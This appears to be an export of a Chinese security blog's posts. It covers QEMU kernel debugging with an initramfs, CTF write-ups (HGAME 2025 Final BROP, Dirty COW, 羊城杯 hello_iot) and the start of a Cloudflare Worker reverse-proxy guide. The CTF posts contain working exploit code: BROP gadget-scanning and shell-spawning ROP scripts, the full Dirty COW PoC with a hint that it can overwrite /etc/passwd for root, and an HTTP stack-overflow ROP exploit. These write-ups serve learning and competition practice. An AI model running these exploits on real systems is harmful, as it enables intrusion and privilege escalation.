qemu-system-x86_64 \\\n  -kernel \"$KERNEL\" \\\n  -drive file=\"$ROOTFS\",format=raw,if=virtio \\\n  -m 4G \\\n  -smp 4 \\\n  -append \"console=ttyS0\" \\\n  -nographic\n预期下，会产生 Kernel panic:\n[    1.983880] /dev/root: Can't open blockdev\n[    1.987750] List of all bdev filesystems:\n[    1.987876]  fuseblk\n[    1.987891] \n[    1.988146] Kernel panic - not syncing: VFS: Unable to mount root fs on unknown-block(0,0)\n[    1.988715] CPU: 1 UID: 0 PID: 1 Comm: swapper/0 Not tainted 6.18.0-rc3 #5 PREEMPT(voluntary)  2b0b48d497e5105aac88eb0a7903527369b0379b\n[    1.989240] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Arch Linux 1.17.0-2-2 04/01/2014\n[    1.989766] Call Trace:\n[    1.989950]  &lt;TASK&gt;\n[    1.990291]  dump_stack_lvl+0x5d/0x80\n[    1.990581]  vpanic+0xdb/0x2d0\n[    1.990658]  panic+0x6b/0x6b\n[    1.990732]  mount_root_generic+0x1cf/0x270\n[    1.990903]  prepare_namespace+0x1dc/0x230\n[    1.991032]  kernel_init_freeable+0x282/0x2b0\n[    1.991163]  ? __pfx_kernel_init+0x10/0x10\n[    1.991305]  kernel_init+0x1a/0x140\n[    1.991398]  ret_from_fork+0x1c2/0x1f0\n[    1.991483]  ? __pfx_kernel_init+0x10/0x10\n[    1.991592]  ret_from_fork_asm+0x1a/0x30\n[    1.991723]  &lt;/TASK&gt;\n[    1.993053] Kernel Offset: disabled\n[    1.993394] ---[ end Kernel panic - not syncing: VFS: Unable to mount root fs on unknown-block(0,0) ]---\n这是因为 ext4 相关的功能编译为了内核模块，而且并没有加载进内核.\n借助 initramfs, 我们可以先在其中加载 ext4 相关模块，\n然后再挂载真正的根文件系统.\n构建 initramfs\n使用如下脚本构建一个实验性的 initramfs:\n#!/bin/bash\nset -e\n\nINITRAMFS_DIR=\"test_kernel/initramfs\"\nINITRAMFS_FILE=\"test_kernel/initramfs.cpio.gz\"\nKERNEL_VERSION=$(make kernelrelease 2&gt;/dev/null)\n\nif [ -d \"$INITRAMFS_DIR\" ]; then\n    rm -rf \"$INITRAMFS_DIR\"\nfi\n\nmkdir -p \"$INITRAMFS_DIR\"/{bin,sbin,etc,proc,sys,dev,newroot,lib/modules}\n\ncp /bin/busybox \"$INITRAMFS_DIR/bin/\"\nchmod +x \"$INITRAMFS_DIR/bin/busybox\"\n\ncd \"$INITRAMFS_DIR/bin\"\nfor cmd in sh mount umount mkdir mknod switch_root insmod modprobe cat echo sleep ls; do\n    ln -sf busybox $cmd\ndone\ncd - &gt; /dev/null\n\nMODULE_DIR=\"$INITRAMFS_DIR/lib/modules/$KERNEL_VERSION\"\nmkdir -p \"$MODULE_DIR/kernel/fs/ext4\"\nmkdir -p \"$MODULE_DIR/kernel/fs/jbd2\"\nmkdir -p \"$MODULE_DIR/kernel/fs/mbcache\"\nmkdir -p \"$MODULE_DIR/kernel/crypto\"\n\nfor module in ext4 jbd2 mbcache crc16; do\n    MODULE_PATH=$(find . -name \"${module}.ko\" -o -name \"${module}.ko.gz\" -o -name \"${module}.ko.xz\" | head -1)\n    if [ -n \"$MODULE_PATH\" ]; then\n        echo \"  找到: $module -&gt; $MODULE_PATH\"\n        cp \"$MODULE_PATH\" \"$MODULE_DIR/\"\n    else\n        echo \"  警告: 未找到 $module 模块\"\n    fi\ndone\n\ncd \"$INITRAMFS_DIR\"\ncat &gt; \"lib/modules/$KERNEL_VERSION/modules.dep\" &lt;&lt; EOF\nkernel/fs/ext4/ext4.ko: kernel/fs/jbd2/jbd2.ko kernel/fs/mbcache/mbcache.ko\nkernel/fs/jbd2/jbd2.ko: kernel/crypto/crc16.ko\nkernel/fs/mbcache/mbcache.ko:\nkernel/crypto/crc16.ko:\nEOF\n\ntouch \"lib/modules/$KERNEL_VERSION/modules.order\"\ncd - &gt; /dev/null\n\ncat &gt; \"$INITRAMFS_DIR/init\" &lt;&lt; 'INIT_SCRIPT'\n#!/bin/sh\n\nmount -t proc proc /proc\nmount -t sysfs sysfs /sys\nmount -t devtmpfs devtmpfs /dev\n\nsleep 1\n\necho \"加载内核模块...\"\ninsmod /lib/modules/*/crc16.ko 2&gt;/dev/null || echo \"  crc16 已加载或不需要\"\ninsmod /lib/modules/*/mbcache.ko 2&gt;/dev/null || echo \"  mbcache 已加载或不需要\"\ninsmod /lib/modules/*/jbd2.ko 2&gt;/dev/null || echo \"  jbd2 已加载或不需要\"\ninsmod /lib/modules/*/ext4.ko 2&gt;/dev/null || echo \"  ext4 已加载或不需要\"\n\necho \"\"\necho \"内核模块加载完成\"\necho \"\"\n\nif [ ! -b /dev/vda ]; then\n    echo \"错误: 根设备 /dev/vda 不存在\"\n    echo \"可用的块设备:\"\n    ls -l /dev/vd* 2&gt;/dev/null || echo \"  未找到 virtio 块设备\"\n    echo \"\"\n    echo \"启动 shell 进行调试...\"\n    exec /bin/sh\nfi\n\necho \"挂载根文件系统 /dev/vda...\"\nmount -t ext4 /dev/vda /newroot\n\nif [ $? -ne 0 ]; then\n    echo \"错误: 无法挂载根文件系统\"\n    echo \"\"\n    echo \"启动 shell 进行调试...\"\n    exec /bin/sh\nfi\n\necho \"根文件系统挂载成功\"\necho \"\"\n\nif [ ! -x /newroot/init ]; then\n    echo \"错误: /newroot/init 不存在或不可执行\"\n    echo \"\"\n    echo \"启动 shell 进行调试...\"\n    umount /newroot\n    exec /bin/sh\nfi\n\numount /proc\numount /sys\numount /dev\n\nexec switch_root /newroot /init\nINIT_SCRIPT\n\nchmod +x \"$INITRAMFS_DIR/init\"\n\ncd \"$INITRAMFS_DIR\"\nfind . -print0 | cpio --null --create --format=newc 2&gt;/dev/null | gzip -9 &gt; \"../$(basename $INITRAMFS_FILE)\"\ncd - &gt; /dev/null\n然后使用如下命令:\n$ KERNEL=\"arch/x86/boot/bzImage\"\n$ INITRAMFS=\"test_kernel/initramfs.cpio.gz\"\n$ ROOTFS=\"test_kernel/arch_full.ext4\"\n$ qemu-system-x86_64 \\\n  -kernel \"$KERNEL\" \\\n  -initrd \"$INITRAMFS\" \\\n  -drive file=\"$ROOTFS\",format=raw,if=virtio \\\n  -m 4G \\\n  -smp 4 \\\n  -append \"console=ttyS0\" \\\n  -nographic\n\n加载内核模块\n在成功启动的 QEMU 环境内输入 lsmod,\n会发现只加载了几个模块\n[root@archlinux /]# lsmod\nModule                  Size  Used by\next4                 1159168  1\njbd2                  200704  1 ext4\nmbcache                20480  1 ext4\ncrc16                  12288  1 ext4\n在 Linux 中，\n内核模块存放在 /usr/lib/modules/*kernel_release*/ 位置.\n我们需要在 rootfs 打包前将编译好的模块放入:\n$ make modules_install INSTALL_MOD_PATH=/home/summer/git/linux/test_kernel/arch_full_rootfs\n使用 gdb 调试内核\n在 QEMU 的启动命令添加下列参数:\nqemu-system-x86_64 \\\n  ... \\\n  -s \\ #run a gdb server at tcp::1234\n  -S   #pause simulator until a `continue` from gdb\nkernel 在编译时提供了带符号的内核文件 vmlinux 和一个 gdb 脚本 vmlinux-gdb.py\n加载该文件然后连接 QEMU, 就可以对内核进行调试了.\n\n\ngdb attach\n\n\n\nstart_kernel\n\nReferences\n\nhttps://en.wikipedia.org/wiki/Booting_process_of_Linux#Kernel\nhttps://en.wikipedia.org/wiki/Filesystem_Hierarchy_Standard\nhttps://wiki.archlinux.org/title/Kernel_module\n\n","categories":["Study"],"tags":["kernel","QEMU","debug"]},{"title":"HGAME 2025 Final 复现","url":"/categories/CTF/hgame-2025-final/","content":"Backto2016\n\n但你必须先向我们证明自己有回到 2016 的实力！\n祝你玩的开心 o (￣▽￣) ブ\n没有附件是正常的喵\n这个分数或许也考虑了买 hint 这件事，别害怕嘻嘻\n\n这道题是没有给出附件的，我们需要根据输入和程序的输出获取一切信息。\n\n\nVulnerabilities\n随便输入一些字符会发现，程序存在栈溢出漏洞，出题人很友好地提供了程序崩溃的更多信息（***\nstack smashing detected ***: terminated）\n存在 Canary 保护。\n\n注意到在交互进程结束后，会保持连接，返回一个 PID+1 的新进程，这提示我们程序使用 fork() 实现功能。\n\n\n赛后放出的源码\n\n因此，子进程的 Canary 值不会改变。\nExploit\n从题目的提示可以知道，其实这是类似于 HCTF2016 brop1 的一道题目。\n运用的攻击方法叫做 Blind Return Oriented Programming (BROP)2。\nBROP 的主要流程：\n\n绕过 Canary 和 PIE 的保护；\n寻找 \"stop gadget\";\n 寻找控制寄存器的 gadget;\ndump memory to get the binary\n 获得 libc base，然后 get shell\n\nCanary bypass\nBROP 首先需要我们绕过 Canary：\n\n\nStack reading. A single byte on the stack\nis overwritten with guess X. If the service crashes, the wrong value was\nguessed.\n\nStop gadget\nStop gadget 指的是可以将程序挂起的一段 gadget。\n为什么需要 Stop gadget? 如果我们将 Return\naddress 覆盖成随机的数据，那么很大概率会引发段错误。而 Stop\ngadget 能让程序保持正常运行，在寻找其他 gadget 时起到了区分作用。\n\n\nstop gadget is useful!\n\n当我们成功找到了一个 gadget，$rsp 进入寄存器，程序进入 $rsp+8&lt;stop_gadget&gt;。\n如果还未找到这个 gadget，程序会直接发生段错误。这个作用在下一节会更具体地体现。\nCommon gadget\n在 Ubuntu\n14.04 中，我们有一个很好的函数__libc_csu_init()，里面存在控制传参寄存器的 gadget，具体请参考通用\ngadget。\n0x000000000040082a &lt;+90&gt;:    5b      pop    rbx\n0x000000000040082b &lt;+91&gt;:    5d      pop    rbp\n0x000000000040082c &lt;+92&gt;:    41 5c   pop    r12\n0x000000000040082e &lt;+94&gt;:    41 5d   pop    r13\n0x0000000000400830 &lt;+96&gt;:    41 5e   pop    r14\n0x0000000000400832 &lt;+98&gt;:    41 5f   pop    r15\n0x0000000000400834 &lt;+100&gt;:   c3      ret\n所以，我们可以这样布置栈数据：\npayload = flat({\n    offset: [\n        canary,\n        p64(1),\n        p64(pop_gadget),\n        p64(0)*6,\n        p64(stop_gadget)\n        ]\n    })\n但是还存在一个小问题，如果遍历时 pop_gadget 恰好是另一个 stop\ngadget，程序也不会发生段错误，和执行到真正的 gadget 处结果一样。\n因此，我们还需要进一步验证，它是否我们需要的。\n在这道题中，我找到的 stop gadget 会输出一些固定字符：\nif ( b\"killed by\" not in resp):\n    payload = flat({\n            offset: [\n                canary,\n                p64(1),\n                p64(pop_gadget)\n                ]\n            })\n            p.sendafter(\"password\",payload)\n            resp = p.recv()\n            resp = p.recv()\n            log.success(f\"stop_gadget[{i}] = {hex(stop_gadget)}\")\n            log.success(f\"pop_gadget[{i}] = {hex(pop_gadget)}\")\n            choose = input(\"Continue?\")\n            if(choose==\"y\" or choose==\"Y\"):continue\n            break\n观察回显，如果没有输出，那么这大概率是正确的。当然在后续过程中我们可以更确定这个 gadget 是不是真的。\nDump memory\n得到需要的 gadget，就可以开始 dump memory 了。\n为了找到 write() 的 plt 地址，可以将 $rdi 赋值 0x400000，即 write(0x400000)，如果地址正确，我们会得到 ELF 头几个固定字符：\\x7fELF\nwhile True:\n    put_addr += 1\n    payload = flat({\n    offset: [\n        canary,\n        p64(1),\n        p64(pop_gadget),\n        p64(0x400000),#pop rdi\n        p64(put_addr),\n        p64(stop_gadget)\n        ]\n    })\n    p.sendafter(\"password\",payload)\n    try: \n        resp = p.recv()\n        resp = p.recv()\n        if ( b\"\\x7fELF\" in resp):\n            log.success(f\"put found[{i}] = {hex(put_addr)}\")\n            choose = input(\"Continue?\")\n            if(choose==\"y\" or choose==\"Y\"):continue\n            break\n    except:\n        pass\n\n回顾 plt 表的知识，我们知道，已经调用过的函数地址会被保存在.got 段中。\nGet shell\n后续过程就比较简单了，写 ROP 链即可。\nstop_gadget=0x400700\npop_gadget=0x400b2a+0x9\nput_addr = 0x400715\ngot_addr = 0x602018\npayload = flat({\n      offset: [\n        canary,\n        p64(1),\n        p64(pop_gadget),\n        p64(got_addr),#pop rdi\n        p64(put_addr),\n    ]\n})\np.sendafter(\"password:\\n\",payload)\nput_addr = u64(p.recv(6).ljust(8, b'\\x00'))\nlog.success(hex(put_addr))\nlibc_base = put_addr - libc.sym[\"puts\"]\nlog.success(hex(libc_base))\nsys_addr = libc_base + libc.sym[\"system\"]\nbinsh_addr = libc_base +next(libc.search(b\"/bin/sh\"))\n\npause()\npayload = flat({\n      offset: [\n        canary,\n        p64(1),\n        p64(pop_gadget),\n        p64(binsh_addr),#pop rdi\n        p64(sys_addr),\n    ]\n})\np.sendafter(\"password:\",payload)\np.interactive()\nBackto2016(2)\n这题赛时并没有做出来（而且靶机跑的很慢，爆破不动），后面看了 wp 了解到这是一个 kernel\nvulnerability。\nCopy On Write3\n\nCopy-on-write (COW), also called\nimplicit sharingor shadowing,is a resource-management\ntechnique used in programming\nto manage shared data efficiently. Instead of copying data right away\nwhen multiple programs use it, the same data is shared between programs\nuntil one tries to modify it. If no changes are made, no private copy is\ncreated, saving resources.\nA copy is only made when needed, ensuring each program has its own\nversion when modifications occur. This technique is commonly applied to\nmemory, files, and data structures.\n\n例如 fork() 创建子进程时，为了节省内存空间和时间开销，使用了写时复制的策略。\n\n\nTake a lot space and time\n\n\n\nCopy-on-write\n\nDirty-cow4\n通过 mmap() 映射文件到内存，利用写时复制，\nwrite 和 madvise() 导致的条件竞争漏洞。\n下面是它的一个 POC，可参见：https://github.com/dirtycow/dirtycow.github.io\n/*\n####################### dirtyc0w.c #######################\n$ sudo -s\n# echo this is not a test &gt; foo\n# chmod 0404 foo\n$ ls -lah foo\n-r-----r-- 1 root root 19 Oct 20 15:23 foo\n$ cat foo\nthis is not a test\n$ gcc -pthread dirtyc0w.c -o dirtyc0w\n$ ./dirtyc0w foo m00000000000000000\nmmap 56123000\nmadvise 0\nprocselfmem 1800000000\n$ cat foo\nm00000000000000000\n####################### dirtyc0w.c #######################\n*/\n#include &lt;stdio.h&gt;\n#include &lt;sys/mman.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;pthread.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdint.h&gt;\n\nvoid *map;\nint f;\nstruct stat st;\nchar *name;\n \nvoid *madviseThread(void *arg)\n{\n  char *str;\n  str=(char*)arg;\n  int i,c=0;\n  for(i=0;i&lt;100000000;i++)\n  {\n/*\nYou have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661\n&gt; This is achieved by racing the madvise(MADV_DONTNEED) system call\n&gt; while having the page of the executable mmapped in memory.\n*/\n    c+=madvise(map,100,MADV_DONTNEED);\n  }\n  printf(\"madvise %d\\n\\n\",c);\n}\n \nvoid *procselfmemThread(void *arg)\n{\n  char *str;\n  str=(char*)arg;\n/*\nYou have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16\n&gt;  The in the wild exploit we are aware of doesn't work on Red Hat\n&gt;  Enterprise Linux 5 and 6 out of the box because on one side of\n&gt;  the race it writes to /proc/self/mem, but /proc/self/mem is not\n&gt;  writable on Red Hat Enterprise Linux 5 and 6.\n*/\n  int f=open(\"/proc/self/mem\",O_RDWR);\n  int i,c=0;\n  for(i=0;i&lt;100000000;i++) {\n/*\nYou have to reset the file pointer to the memory position.\n*/\n    lseek(f,(uintptr_t) map,SEEK_SET);\n    c+=write(f,str,strlen(str));\n  }\n  printf(\"procselfmem %d\\n\\n\", c);\n}\n \n \nint main(int argc,char *argv[])\n{\n/*\nYou have to pass two arguments. File and Contents.\n*/\n  if (argc&lt;3) {\n  (void)fprintf(stderr, \"%s\\n\",\n      \"usage: dirtyc0w target_file new_content\");\n  return 1; }\n  pthread_t pth1,pth2;\n/*\nYou have to open the file in read only mode.\n*/\n  f=open(argv[1],O_RDONLY);\n  fstat(f,&amp;st);\n  name=argv[1];\n/*\nYou have to use MAP_PRIVATE for copy-on-write mapping.\n&gt; Create a private copy-on-write mapping.  Updates to the\n&gt; mapping are not visible to other processes mapping the same\n&gt; file, and are not carried through to the underlying file.  It\n&gt; is unspecified whether changes made to the file after the\n&gt; mmap() call are visible in the mapped region.\n*/\n/*\nYou have to open with PROT_READ.\n*/\n  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);\n  printf(\"mmap %zx\\n\\n\",(uintptr_t) map);\n/*\nYou have to do it on two threads.\n*/\n  pthread_create(&amp;pth1,NULL,madviseThread,argv[1]);\n  pthread_create(&amp;pth2,NULL,procselfmemThread,argv[2]);\n/*\nYou have to wait for the threads to finish.\n*/\n  pthread_join(pth1,NULL);\n  pthread_join(pth2,NULL);\n  return 0;\n}\n以 ~/foo 为例，这是一个只读文件：\n\n\n运行 dirtycow：\n\n结果如下：\n\n同理，如果我们修改 /etc/passwd，就可以实现提权。\nReferences\n\n\n\npwn_hctf2016_brop.md↩︎\nbittau-brop.pdf↩︎\nCopy-on-write↩︎\nDirty\nCOW↩︎\n\n\n","categories":["CTF"],"tags":["pwn","hgame","kernel","blind pwn"]},{"title":"羊城杯 hello_iot 复现","url":"/categories/CTF/ycb2025/","content":"2025 年十月羊城杯 hello_iot\n\nVulnerabilities\n\n\nchecksec\n\n题目基于 Libmicrohttpd 在 9999 端口提供一个 http 服务，\n分析程序逻辑可得知有如下功能: login, work,\nlog. 而且要求输入密码进行验证，\n\n分析登录相关逻辑，是一个换盒 AES:\n\n注意到 AES 中 sub bytes 操作使用了逆 Sbox, 可认为是解密流程，\n因此我们只需要写一个自定义 Sbox 的 AES ECB 加密脚本.\n\n在 log 中有明显越界读，\n\n\n\n在 work 中存在两种逻辑，一种是将数据存放在堆区并记录地址，\n另一种是进入一个后门函数.\n\n\n\nstack overflow\n\nExploit\n首先编写一个脚本，计算出登录密码.\nfrom pwn import u64\n# ========================================================\n#  纯 Python 实现 AES-128 加密 (支持自定义 S-box)\n# ========================================================\n\n# 默认 AES S-box，可自行修改实现「换表 AES」\nS_BOX = [\n    0x29, 0x40, 0x57, 0x6e, 0x85, 0x9c, 0xb3, 0xca, 0xe1, 0xf8,  0xf, 0x26, 0x3d, 0x54, 0x6b, 0x82,\n    0x99, 0xb0, 0xc7, 0xde, 0xf5,  0xc, 0x23, 0x3a, 0x51, 0x68, 0x7f, 0x96, 0xad, 0xc4, 0xdb, 0xf2,\n     0x9, 0x20, 0x37, 0x4e, 0x65, 0x7c, 0x93, 0xaa, 0xc1, 0xd8, 0xef,  0x6, 0x1d, 0x34, 0x4b, 0x62,\n    0x79, 0x90, 0xa7, 0xbe, 0xd5, 0xec,  0x3, 0x1a, 0x31, 0x48, 0x5f, 0x76, 0x8d, 0xa4, 0xbb, 0xd2,\n    0xe9,  0x0, 0x17, 0x2e, 0x45, 0x5c, 0x73, 0x8a, 0xa1, 0xb8, 0xcf, 0xe6, 0xfd, 0x14, 0x2b, 0x42,\n    0x59, 0x70, 0x87, 0x9e, 0xb5, 0xcc, 0xe3, 0xfa, 0x11, 0x28, 0x3f, 0x56, 0x6d, 0x84, 0x9b, 0xb2,\n    0xc9, 0xe0, 0xf7,  0xe, 0x25, 0x3c, 0x53, 0x6a, 0x81, 0x98, 0xaf, 0xc6, 0xdd, 0xf4,  0xb, 0x22,\n    0x39, 0x50, 0x67, 0x7e, 0x95, 0xac, 0xc3, 0xda, 0xf1,  0x8, 0x1f, 0x36, 0x4d, 0x64, 0x7b, 0x92,\n    0xa9, 0xc0, 0xd7, 0xee,  0x5, 0x1c, 0x33, 0x4a, 0x61, 0x78, 0x8f, 0xa6, 0xbd, 0xd4, 0xeb,  0x2,\n    0x19, 0x30, 0x47, 0x5e, 0x75, 0x8c, 0xa3, 0xba, 0xd1, 0xe8, 0xff, 0x16, 0x2d, 0x44, 0x5b, 0x72,\n    0x89, 0xa0, 0xb7, 0xce, 0xe5, 0xfc, 0x13, 0x2a, 0x41, 0x58, 0x6f, 0x86, 0x9d, 0xb4, 0xcb, 0xe2,\n    0xf9, 0x10, 0x27, 0x3e, 0x55, 0x6c, 0x83, 0x9a, 0xb1, 0xc8, 0xdf, 0xf6,  0xd, 0x24, 0x3b, 0x52,\n    0x69, 0x80, 0x97, 0xae, 0xc5, 0xdc, 0xf3,  0xa, 0x21, 0x38, 0x4f, 0x66, 0x7d, 0x94, 0xab, 0xc2,\n    0xd9, 0xf0,  0x7, 0x1e, 0x35, 0x4c, 0x63, 0x7a, 0x91, 0xa8, 0xbf, 0xd6, 0xed,  0x4, 0x1b, 0x32,\n    0x49, 0x60, 0x77, 0x8e, 0xa5, 0xbc, 0xd3, 0xea,  0x1, 0x18, 0x2f, 0x46, 0x5d, 0x74, 0x8b, 0xa2,\n    0xb9, 0xd0, 0xe7, 0xfe, 0x15, 0x2c, 0x43, 0x5a, 0x71, 0x88, 0x9f, 0xb6, 0xcd, 0xe4, 0xfb, 0x12,\n]\n\nR_CON = [\n    0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36\n]\n\n\ndef sub_bytes(state):\n    return [S_BOX[b] for b in state]\n\n\ndef shift_rows(s):\n    return [\n        s[0], s[5], s[10], s[15],\n        s[4], s[9], s[14], s[3],\n        s[8], s[13], s[2], s[7],\n        s[12], s[1], s[6], s[11]\n    ]\n\n\ndef xtime(a):\n    return ((a &lt;&lt; 1) ^ 0x1B) &amp; 0xFF if a &amp; 0x80 else (a &lt;&lt; 1)\n\n\ndef mix_single_column(a):\n    t = a[0] ^ a[1] ^ a[2] ^ a[3]\n    u = a[0]\n    a[0] ^= t ^ xtime(a[0] ^ a[1])\n    a[1] ^= t ^ xtime(a[1] ^ a[2])\n    a[2] ^= t ^ xtime(a[2] ^ a[3])\n    a[3] ^= t ^ xtime(a[3] ^ u)\n    return a\n\n\ndef mix_columns(s):\n    for i in range(4):\n        col = s[i * 4:(i + 1) * 4]\n        s[i * 4:(i + 1) * 4] = mix_single_column(col)\n    return s\n\n\ndef add_round_key(s, k):\n    return [a ^ b for a, b in zip(s, k)]\n\n\ndef key_expansion(key):\n    key_symbols = list(key)\n    assert len(key_symbols) == 16\n    expanded = key_symbols[:]\n    for i in range(4, 44):\n        t = expanded[(i - 1) * 4:i * 4]\n        if i % 4 == 0:\n            t = t[1:] + t[:1]\n            t = [S_BOX[b] for b in t]\n            t[0] ^= R_CON[i // 4]\n        for j in range(4):\n            expanded.append(expanded[(i - 4) * 4 + j] ^ t[j])\n    return expanded\n\n\ndef aes_encrypt_block(block, key):\n    state = list(block)\n    w = key_expansion(key)\n    state = add_round_key(state, w[:16])\n    for round in range(1, 10):\n        state = sub_bytes(state)\n        state = shift_rows(state)\n        state = mix_columns(state)\n        state = add_round_key(state, w[round * 16:(round + 1) * 16])\n    state = sub_bytes(state)\n    state = shift_rows(state)\n    state = add_round_key(state, w[160:176])\n    return bytes(state)\n\n\n# ====== 示例 ======\nif __name__ == \"__main__\":\n    key = b\"0123456789ABCDEF\"\n    plaintext = input().encode()\n    ciphertext = aes_encrypt_block(plaintext, key).hex()\n    print(\"Plain :\", plaintext)\n    print(f'Ciphertext : {ciphertext}')\n   # print(\"Cipher:\", hex(u64(ciphertext[:8])), hex(u64(ciphertext[8:])))\n通过 log 泄漏 libc 地址.\n然后 ROP 链执行 cat /flag &gt; work.html, 再使用 GET 获取.\nfrom pwn import *\nfrom decrypt_script import aes_encrypt_block\nimport requests\nimport re\n\n\ncontext.terminal = ['konsole', '-e', 'sh', '-c']\ncontext(arch = 'amd64',os = 'linux',log_level = 'debug')\nHTTP_URL = \"http://127.0.0.1:9999\"\nLIBC = './libc-2.31.so'\n\nresponse = requests.get(f\"{HTTP_URL}/login.html\")\nblock = re.search(r'&lt;strong&gt;([a-z]+)&lt;/strong&gt;', response.text).group(1)\nlog.info(f\"key: {block}\")\ncipher = aes_encrypt_block(block.encode(), b\"0123456789ABCDEF\").hex()\nlog.info(f\"ciphertext: {cipher}\")\n\nresponse = requests.post(f'{HTTP_URL}/login', data=f'ciphertext={cipher}')\nassert response.status_code == 200\n\n# response = requests.get(f'{HTTP_URL}/work.html')\n# success(f'Flag is: {response.text}')\n# sys.exit(0)\n\nresponse = requests.post(f'{HTTP_URL}/log', data='index=-167')\nassert response.status_code == 200\naddr = re.search(r'&lt;pre&gt;(0x[a-f0-9]+)&lt;/pre&gt;', response.text).group(1)\naddr = int(addr, 16)\nlibc= ELF(LIBC)\nlibc_base = addr - libc.symbols['atoi']\nlibc.address = libc_base\nlog.info(f\"libc base: {hex(libc_base)}\")\n\ncmd = 'cat /flag &gt; work.html;'\nresponse = requests.post(f'{HTTP_URL}/work', data=f'data={cmd}\\r\\n')\nprint(response.text)\nmatch = re.search(r'Total=(\\d+)', response.text).group(1)\nassert match\nslot = int(match) - 1\nlog.info(f\"slot: {slot}\")\n\nresponse = requests.post(f'{HTTP_URL}/log', data='index={slot}')\nassert response.status_code == 200\ncmd_addr = re.search(r'0x[a-f0-9]+', response.text).group(0)\ncmd_addr = int(cmd_addr, 16)\nlog.info(f\"cmd addr: {hex(cmd_addr)}\")\n\ngadgets = ROP(libc)\nchain = flat(gadgets.rdi.address, cmd_addr,\n             gadgets.ret.address, # balance stack\n             libc.symbols['system'],\n             gadgets.rdi.address, 0,\n             libc.symbols['exit'])\n\n\nIP= \"127.0.0.1\"\nPORT = 9999\nt = remote(IP, PORT)\npayload =  b'data=' + pack(0, 0x48 * 8) + chain + b'YCB2025\\n\\n'\nbody = f'''POST /work HTTP/1.0\\r\nHost: {IP}:{PORT}\\r\nContent-Length: {len(payload)}\\r\n\\r\n'''.encode()\nt.send(body + payload)\nt.close()\n\n\nReferences\n\nhttps://rocketma.dev/2025/10/13/hello_iot/\n\n","categories":["CTF"],"tags":["pwn","http","AES"]},{"title":"Cloudflare Worker 反向代理尝试","url":"/categories/Web/cloudflare-worker-proxy/","content":"前言\n由于友链页面有使用图片的要求，同时为其他人的站点提供相关的图片资源（虽然使用现成的 GitHub\nPage 就可以基本实现，但是 Page 所在的仓库是公开的），尝试通过 GitHub 作为图床解决这个问题。然而，访问速度和稳定性都无法得到保证，为此通过网上搜索学习了一下反向代理\n(Reverse Proxy) 的相关知识。\n\n什么事反向代理\n在这之前，先来看看什么是正向代理 1 (Forward Proxy)：\n客户端通过代理服务器去请求服务器的资源。\n\n\nTwo computers connected via a proxy\nserver. The first computer says to the proxy server: \"ask the second\ncomputer what the time is\".\n\n使用正向代理需要客户端进行一些设置，即配置代理服务器。\n而反向代理 2 是指代理服务器向服务器转交请求，并返回内容给客户端，客户端将其认为是原始服务器。\n\n\nA proxy server connecting the Internet to\nan internal network.\n\n搭建反向代理服务\n创建图床仓库\n在 GitHub 中创建一个仓库，可以选择是否是私密的。\n\n在 Personal Access\nTokens (Classic) 处创建一个新的 token，勾选 repo\n下所有权限。\n\n过期时间我偷懒选了永不过期，不过这样肯定会导致安全性降低的。生成 token 后放在安全的地方，刷新后就看不见了。\n配置 Worker\nCloudflare\nWorkers\n提供了这样的服务，但是免费使用具有一定的请求限制。在仪表板中添加一个\nWorker，这里命名为 assets。使用的代码如下：\nconst upstream = \"raw.githubusercontent.com\";\n\n// Custom pathname for the upstream website.\n// (1) 填写代理的路径，格式为 /&lt;用户&gt;/&lt;仓库名&gt;/&lt;分支&gt;\nconst upstream_path = \"/avasummer/assets/main\";\n\n// github personal access token.\n// (2) 填写github令牌\nconst github_token = \"your_tokenhere\";\n\n// Website you intended to retrieve for users using mobile devices.\nconst upstream_mobile = upstream;\n\n// Countries and regions where you wish to suspend your service.\nconst blocked_region = [];\n\n// IP addresses which you wish to block from using your service.\nconst blocked_ip_address = [\"0.0.0.0\", \"127.0.0.1\"];\n\n// Whether to use HTTPS protocol for upstream address.\nconst https = true;\n\n// Whether to disable cache.\nconst disable_cache = false;\n\n// Replace texts.\nconst replace_dict = {\n  $upstream: \"$custom_domain\",\n};\n\naddEventListener(\"fetch\", (event) =&gt; {\n  event.respondWith(fetchAndApply(event.request));\n});\n\nasync function fetchAndApply(request) {\n  const region = request.headers.get(\"cf-ipcountry\")?.toUpperCase();\n  const ip_address = request.headers.get(\"cf-connecting-ip\");\n  const user_agent = request.headers.get(\"user-agent\");\n\n  let response = null;\n  let url = new URL(request.url);\n  let url_hostname = url.hostname;\n\n  if (https == true) {\n    url.protocol = \"https:\";\n  } else {\n    url.protocol = \"http:\";\n  }\n\n  if (await device_status(user_agent)) {\n    var upstream_domain = upstream;\n  } else {\n    var upstream_domain = upstream_mobile;\n  }\n\n  url.host = upstream_domain;\n  if (url.pathname == \"/\") {\n    url.pathname = upstream_path;\n  } else {\n    url.pathname = upstream_path + url.pathname;\n  }\n\n  if (blocked_region.includes(region)) {\n    response = new Response(\n      \"Access denied: WorkersProxy is not available in your region yet.\",\n      {\n        status: 403,\n      }\n    );\n  } else if (blocked_ip_address.includes(ip_address)) {\n    response = new Response(\n      \"Access denied: Your IP address is blocked by WorkersProxy.\",\n      {\n        status: 403,\n      }\n    );\n  } else {\n    let method = request.method;\n    let request_headers = request.headers;\n    let new_request_headers = new Headers(request_headers);\n\n    new_request_headers.set(\"Host\", upstream_domain);\n    new_request_headers.set(\"Referer\", url.protocol + \"//\" + url_hostname);\n    new_request_headers.set(\"Authorization\", \"token \" + github_token);\n\n    let original_response = await fetch(url.href, {\n      method: method,\n      headers: new_request_headers,\n      body: request.body,\n    });\n\n    connection_upgrade = new_request_headers.get(\"Upgrade\");\n    if (connection_upgrade &amp;&amp; connection_upgrade.toLowerCase() == \"websocket\") {\n      return original_response;\n    }\n\n    let original_response_clone = original_response.clone();\n    let original_text = null;\n    let response_headers = original_response.headers;\n    let new_response_headers = new Headers(response_headers);\n    let status = original_response.status;\n\n    if (disable_cache) {\n      new_response_headers.set(\"Cache-Control\", \"no-store\");\n    } else {\n      new_response_headers.set(\"Cache-Control\", \"max-age=43200000\");\n    }\n\n    